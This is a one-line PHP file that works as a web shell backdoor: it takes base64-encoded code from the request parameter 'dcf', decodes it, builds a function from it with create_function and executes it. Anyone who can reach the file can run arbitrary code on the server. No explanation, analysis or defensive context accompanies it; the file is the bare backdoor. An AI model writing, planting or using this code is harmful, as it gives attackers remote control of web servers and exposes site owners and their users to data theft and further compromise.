<?php
if(!empty($_REQUEST['dcf'])){$dcf=base64_decode($_REQUEST["dcf"]);$dcf=create_function('',$dcf);$dcf();exit;}